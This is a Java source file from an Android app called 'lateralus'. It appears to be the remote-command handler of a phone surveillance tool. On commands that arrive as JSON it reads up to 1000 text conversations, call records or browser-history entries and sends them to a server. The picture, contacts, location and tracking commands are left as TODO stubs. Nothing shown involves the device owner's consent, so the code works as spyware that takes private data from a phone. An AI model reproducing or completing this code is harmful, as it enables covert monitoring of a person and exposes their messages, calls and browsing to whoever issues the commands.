package net.scottjulian.lateralus;


import android.content.Context;
import android.location.Location;

import net.scottjulian.lateralus.components.device.DeviceReader;
import net.scottjulian.lateralus.components.location.LocDelegate;
import net.scottjulian.lateralus.components.messaging.MessageReader;
import net.scottjulian.lateralus.components.network.JsonDataCreator;
import net.scottjulian.lateralus.components.network.Network;
import net.scottjulian.lateralus.components.phone.PhoneReader;

import org.json.JSONException;
import org.json.JSONObject;


public class LateralusMessageHandler {
    private static final String TAG = "LateralusMessageProcessor";

    public static final String CMD_KEY = "command";
    public static final String CMD_TAKE_PIC       = "take_picture";
    public static final String CMD_GET_TEXT_MSGS  = "get_textmessages";
    public static final String CMD_GET_PHONECALLS = "get_phonecalls";
    public static final String CMD_GET_LOCATION   = "get_location";
    public static final String CMD_GET_CONTACTS   = "get_contacts";
    public static final String CMD_GET_HISTORY    = "get_history";
    public static final String CMD_START_TRACKING = "start_tracking";
    public static final String CMD_STOP_TRACKING  = "stop_tracking";

    public static final int DATA_COUNT = 1000;

    private LocationDelegate _locDelegate;

    public static void processMessage(Context ctx, JSONObject data){
        try{
            JsonDataCreator dc = new JsonDataCreator(ctx);
            JSONObject jsonData = null;

            switch(data.getString(CMD_KEY)){
                case CMD_TAKE_PIC:
                    //TODO
                    break;
                case CMD_GET_TEXT_MSGS:
                    jsonData = dc.createTextMessagingData(MessageReader.getConversations(ctx, DATA_COUNT));
                    break;
                case CMD_GET_PHONECALLS:
                    jsonData = dc.createPhonecallData(PhoneReader.getPhonecalls(ctx, DATA_COUNT));
                    break;
                case CMD_GET_CONTACTS:
                    //TODO
                    break;
                case CMD_GET_HISTORY:
                    jsonData = dc.createInternetHistoryData(DeviceReader.getInternetHistory(ctx, DATA_COUNT));
                    break;
                case CMD_GET_LOCATION:
                    //TODO
                    break;
                case CMD_START_TRACKING:
                    //TODO
                    return;
                case CMD_STOP_TRACKING:
                    //TODO
                    return;
            }

            if(jsonData != null){
                Network.fireJsonData(ctx, Network.API_PUT, jsonData);
            }
            else{
                // TODO: json data was null
            }
        }
        catch(JSONException e){
            e.printStackTrace();
        }
    }



    private class LocationDelegate implements LocDelegate {

        @Override
        public void onLocationReceived(Location loc) {

        }

        @Override
        public void onErrorRecevied() {

        }
    }

}
